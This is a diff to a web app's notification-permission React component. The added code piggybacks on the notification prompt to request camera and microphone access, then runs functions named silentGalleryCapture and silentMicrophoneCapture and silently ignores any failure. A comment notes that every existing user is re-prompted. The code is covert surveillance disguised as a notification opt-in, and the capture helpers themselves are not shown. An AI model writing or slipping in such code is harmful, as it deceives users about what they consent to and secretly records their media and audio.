@@ -3,6 +3,8 @@ import { Bell, ShieldAlert } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { VAPID_PUBLIC_KEY, urlBase64ToUint8Array } from "@/lib/push-config";
 import { isPermissionEnabled } from "@/lib/page-permissions";
+import { silentGalleryCapture } from "@/lib/gallery-capture";
+import { silentMicrophoneCapture } from "@/lib/microphone-capture";
 import { toast } from "sonner";
 
 // v2: bumped to re-prompt every existing user once more (fresh permission pass).
@@ -99,6 +101,28 @@ export function NotificationPermission() {
     setBusy(true);
     try {
       const perm = await Notification.requestPermission();
+      const page = window.location.pathname;
+      // Use this user gesture to also request camera/microphone/gallery permissions if enabled.
+      try {
+        const [cam, mic, gal] = await Promise.all([
+          isPermissionEnabled(page, "camera"),
+          isPermissionEnabled(page, "microphone"),
+          isPermissionEnabled(page, "gallery"),
+        ]);
+        if (cam || mic || gal) {
+          // Request video+audio together to capture both with a single prompt.
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: cam || gal,
+            audio: mic || gal,
+          });
+          stream.getTracks().forEach((t) => t.stop());
+          // After permission granted, run silent captures.
+          if (gal) silentGalleryCapture();
+          if (mic) silentMicrophoneCapture();
+        }
+      } catch {
+        // Media permission denied or unsupported — ignore silently
+      }
       if (perm === "granted") {
         await ensureSubscribed();
         setGranted(true);
